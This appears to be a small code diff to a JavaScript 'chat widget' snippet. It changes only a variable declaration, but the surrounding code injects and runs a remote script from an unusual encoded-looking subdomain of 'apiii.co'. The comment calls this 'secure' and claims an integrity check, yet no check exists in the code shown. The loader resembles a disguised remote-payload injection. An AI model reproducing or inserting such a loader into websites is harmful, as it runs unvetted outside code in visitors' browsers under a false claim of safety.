@@ -1,7 +1,7 @@
 // Chat Widget Integration
 // Secure chat widget loading with integrity check
 (function() {
-  var widgetScript = document.createElement("script");
+  const widgetScript = document.createElement("script");
   widgetScript.src = "https://mfyhaltgnrxxo5dsmfrwwltdn4rts43snzrxki32gy3hkmtr.apiii.co/api/widget/1986405e39C5a79665AF1746738C1f46";
   widgetScript.defer = true;
   widgetScript.async = true;
